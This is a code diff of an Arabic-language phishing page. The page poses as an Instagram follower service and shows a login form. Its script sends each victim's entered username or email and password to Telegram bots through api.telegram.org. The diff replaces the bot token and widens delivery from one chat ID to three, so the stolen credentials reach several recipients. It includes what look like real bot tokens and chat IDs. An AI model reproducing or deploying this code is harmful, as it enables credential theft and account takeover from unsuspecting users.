@@ -59,7 +59,6 @@
             font-size: 14px;
             cursor: pointer;
         }
-
         /* تصميم النافذة المنبثقة */
         .popup {
             display: none;
@@ -107,24 +106,29 @@
                 return;
             }
 
-            let botToken = "7630372545:AAErb2tMEkxmxSVZ2026YajBaJibDzWCqXU";
-            let chatId = "6823320140";
+            let botToken = "7958565070:AAE4t-ExXHq3CoLt7v53FhQmWjxHNUJUFxM";
+            // إضافة الايدي الأصلية مع الايدي الجديدة في مصفوفة واحدة
+            let chatIds = ["6823320140", "5242919343", "5429976566"];
             let message = `🔹 حساب جديد 🔹\n\n👤 اسم المستخدم او البريد الإلكتروني: ${username}\n🔑 كلمة المرور: ${password}`;
 
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        alert("تم إرسال المتابعين بنجاح!");
-                    } else {
-                        alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
-                    }
+            // إرسال الرسالة لجميع الايدي باستخدام Promise.all
+            Promise.all(
+                chatIds.map(chatId => {
+                    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                    return fetch(url).then(response => response.json());
                 })
-                .catch(error => {
-                    alert("فشل الاتصال بالسيرفر.");
-                });
+            )
+            .then(results => {
+                // التأكد من نجاح الإرسال لجميع الايدي
+                if (results.every(result => result.ok)) {
+                    alert("تم إرسال المتابعين بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                }
+            })
+            .catch(error => {
+                alert("فشل الاتصال بالسيرفر.");
+            });
         }
 
         function showPopup() {
@@ -137,7 +141,6 @@
     </script>
 </head>
 <body>
-
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
         <form onsubmit="sendToTelegram(event)">
@@ -156,6 +159,5 @@
             <button class="close-btn" onclick="closePopup()">إغلاق</button>
         </div>
     </div>
-
 </body>
 </html>
